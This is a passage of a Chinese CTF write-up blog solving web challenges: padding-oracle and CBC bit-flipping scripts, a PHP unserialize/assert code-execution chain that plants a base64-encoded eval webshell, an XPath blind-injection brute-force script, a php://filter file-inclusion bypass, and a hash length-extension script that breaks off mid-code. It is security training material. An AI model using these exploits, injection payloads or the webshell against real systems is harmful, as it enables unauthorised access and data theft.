die(&#39;False&#39;)</code>，导致正常解密会返回<code>1</code>，有想着本地测试把这个删除，但是由于key未知，无法成功解密</p><p>没啥别的想法，搜<code>openssl_decrypt()</code>的bug也没收获，遂作罢</p><p>==========================重新看一下</p><p>CBC模式的加密方式是通过一个初始向量（<code>IV</code>）先和明文分组第一组异或后使用秘钥K加密，作为第一组密文，同时又与后一分组的明文异或后进行加密产生下一组密文，依次重复。其解密和加密是对称的，密文先解密，再异或。</p><p><strong>Padding Oracle Attack</strong></p><blockquote><p><a href="https://www.cnblogs.com/p00mj/p/11797786.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/11797786.html</a> </p></blockquote><p>条件：已知<code>IV</code>和密文，可以利用服务端解密</p><p>结果：获取密文对应的明文(如果分组大于1组，没有<code>IV</code>的情况这里可以获取到部分明文) </p><p>和题目给的条件完全符合。</p><p>分组加密中数据填充常用的方式（<code>PKCS#5</code>）</p><p>核心思想（比如求最后一位）</p><p><img src="https://i.loli.net/2020/04/21/iD3qNK5wjGVHvut.png" alt="Snipaste_2020-04-21_16-24-40.png"></p><p>穷举<code>IV</code>，当正常解密时（<code>0x3C</code>）即可利用明文<code>0x01 xor 0x3C</code>得到中间值为<code>0X3D</code>，而原始<code>IV</code>为<code>0X39</code>，</p><p><code>明文 = 中间值 xor IV</code>，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x01 &#x3D; 中间值 xor 0x3c</span><br><span class="line">待求明文 &#x3D; 中间值 xor 0x39</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">待求明文 &#x3D; 0x01 xor 0x3c xor 0x39</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>第二关源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>cbc字节翻转攻击</strong></p><p>以前接触的一般是已知<code>IV</code>，一组明文和密文，伪造密文得到想要的明文。</p><p>但是由于这里加密的明文较短（16位以内），并且可以伪造<code>IV</code>，也可以进行CBC字节翻转</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'sS8OuVOl9tyCkzAzsabGBA=='</span>  <span class="comment"># 你获得的初始IV的base64encode值</span></span><br><span class="line">token = list(b64.b64decode(token))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line"><span class="keyword">print</span> b64.b64encode(<span class="string">''</span>.join(token))</span><br></pre></td></tr></table></figure><p>刚想打好像环境没了。。</p><p>===========================第二天buu上的环境就搭好了哈哈</p><p>得到网盘地址下载得到<code>HelloWorld.class</code>，<code>jd-gui</code>反编译得到flag</p><h3><span id="realezphp">RealEzPHP</span></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-20</span> <span class="number">12</span>:<span class="number">59</span>:<span class="number">59</span></span><br></pre></td></tr></table></figure><p>利用<code>assert()</code>命令执行，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">PHP Version 7.0.33</span><br><span class="line">disable_function</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure><p>下一步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#39;&#x2F;&#39;))</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">string(10) &quot;FIag_!S_it&quot;</span><br><span class="line"></span><br><span class="line">禁用了readfile,尝试file_get_contents()</span><br><span class="line">var_dump(base64_encode(file_get_contents(\&#39;&#x2F;FIag_!S_it\&#39;)))</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">string(64) &quot;TlBVQ1RGe3RoaXNfaXNfbm90X2FfZmFrZV9mbGFnX2J1dF90cnVlX2ZsYWd9Cg&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>可惜flag是错的，想办法连蚁剑，通过下面的方式写入一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#39;1.php&#39;, base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;&#39;))</span><br></pre></td></tr></table></figure><blockquote><p>一开始自己的测试环境是<code>php7.1.9</code>，但是发现在<code>php7.1.9</code>中无法正常写入，提示<code>Cannot call assert() with string argument dynamically</code>，切换成<code>php7.0.9</code>成功写入。网上解释的也不清楚，最好的办法还是切成和题目相同的环境</p></blockquote><p>最后可以通过<code>error_log()</code>bypass，非预期解是<code>phpinfo()</code>中的环境变量</p><hr><h3><span id="ezlogin">ezlogin</span></h3><p>hint：请自行了解XPath盲注，路径表达式可用于选取XML文档中的节点或者节点集</p><blockquote><p><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">xpath注入详解</a></p><p><a href="https://www.tr0y.wang/2019/05/11/XPath注入指北/" target="_blank" rel="noopener">xpath注入指北</a></p></blockquote><p>demo</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>3<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>5<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secret</span>&gt;</span>flag&#123;xxx&#125;<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查询语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p><strong>常规注入</strong></p><p>万能密码1（已知一个节点）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p>万能密码2（无需知道节点）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or 1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p>节点遍历</p><blockquote><p><code>|</code>表示计算两个节点集，<code>//*</code>表示选取文档中所有元素</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><p>之前的节点遍历虽然选取到了所有数据，但是通常不会打印出来，打印一部分或者只是用来做个判断。</p><p>判断根节点数量</p><blockquote><p><code>/</code>表示从根节点选取</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39;or count(&#x2F;)&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p>正常回显说明只有一个根节点</p><p>获取根节点长度</p><blockquote><p><code>/*[1]</code>表示先选取所有根节点，再取第一个元素</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or string-length(name(&#x2F;*[1]))&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p>正常回显说明根节点长度为1</p><p>获取根节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(name(&#x2F;*[1]), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p>正常回显说明根节点第一位为<code>a</code></p><p>获取文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(&#x2F;a&#x2F;b&#x2F;id&#x2F;text(), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure><p><strong>解题思路</strong></p><p>先万能密码测试，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2&#39; or &#39;1</span><br><span class="line">&#x3D;&gt;用户名或密码错误</span><br><span class="line">2&#39; or 1 or &#39;1</span><br><span class="line">&#x3D;&gt;非法操作</span><br></pre></td></tr></table></figure><p>说明<code>非法操作</code>是条件为真的情况下，写个脚本</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(username)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    url = <span class="string">'http://ha1cyon-ctf.fun:30100/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url).content</span><br><span class="line">    <span class="comment"># print r.decode('utf-8')</span></span><br><span class="line">    re = re.search(<span class="string">r'value="(.*?)" /&gt;'</span>, r.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    token = re.group(<span class="number">0</span>)[<span class="number">7</span>:<span class="number">-4</span>]</span><br><span class="line">    <span class="comment"># print token</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    data = <span class="string">'&lt;username&gt;'</span>+username+<span class="string">'&lt;/username&gt;'</span> \</span><br><span class="line">            <span class="string">'&lt;password&gt;'</span>+password+<span class="string">'&lt;/password&gt;'</span> \</span><br><span class="line">            <span class="string">'&lt;token&gt;'</span>+token+<span class="string">'&lt;/token&gt;'</span></span><br><span class="line">    r = s.post(url, headers=headers, data=data).content</span><br><span class="line">    <span class="comment"># print r.content.decode('utf-8')</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> r.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        print(<span class="string">"ok"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    req(<span class="string">"2' or '1"</span>)</span><br><span class="line">    req(<span class="string">"2' or 1 or '1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlen</span><span class="params">()</span>:</span></span><br><span class="line">    len = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/*[1]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/root/*[1]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/root/accounts/user/*[3]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        username = <span class="string">"' or string-length(/root/accounts/user[2]/password/text())=&#123;&#125; or '1"</span>.format(i)</span><br><span class="line">        print(username)</span><br><span class="line">        res = req(username)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">len = getlen()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># username = "'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># username = "'or substring(name(/root*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># username = "'or substring(name(/root/accounts/user/*[3]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># id,username,password</span></span><br><span class="line">        username = <span class="string">"'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1"</span>.format(i + <span class="number">1</span>, chr(j))</span><br><span class="line">        <span class="comment"># guest,adm1n</span></span><br><span class="line">        <span class="comment"># cf7414b5bdb2e65ee43083f4ddbc4d9f=&gt;gtfly123</span></span><br><span class="line">        print(username)</span><br><span class="line">        res = req(username)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>登录后台，发现文件包含，提示<code>/flag</code></p><p>发现黑名单，使用大小写成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Php:&#x2F;&#x2F;filter&#x2F;Read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/21/T1yfxrSaEVK67bY.png" alt="Snipaste_2020-04-21_15-19-07.png"></p><hr><h3><span id="ezinclude">ezinclude</span></h3><p>提示<code>md5($secret.$name)===$pass</code></p><p>扫目录，<code>dir.php</code>显示了某个目录下的文件，和<code>config.php</code></p><p>=======================当时没有啥思路</p><blockquote><p><a href="[https://www.sqx-ub1sec.tech/ctfweb%E4%B8%93%E5%8C%BA/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0#h.v5881zz4r36z](https://www.sqx-ub1sec.tech/ctfweb专区/出题手记#h.v5881zz4r36z)">参考链接</a></p></blockquote><p><code>md5($secret.$name)===$pass</code>说明是hash长度扩展攻击，</p><p>利用条件：</p><p>1、secret的长度</p><p>2、data的值</p><p>3、secret+data的值</p><p>其中secret的长度可爆破，写个脚本</p><p>一个经典的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a gqy</span><br></pre></td></tr></table></figure><p>将得到的结果第一行作为<code>getmein</code>，第二行作为<code>password</code></p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn?'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    <span class="comment"># 传admin得到hash</span></span><br><span class="line">    a, b = hashpumpy.hashpump(<span class="string">'973225ae4fc8977f86d1a330b0774630'</span>,<span class="string">'admin'</span>,<span class="string">'1'</span>,i)</span><br><span class="line">    print(a, b)</span><br><span class="line">    req = requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        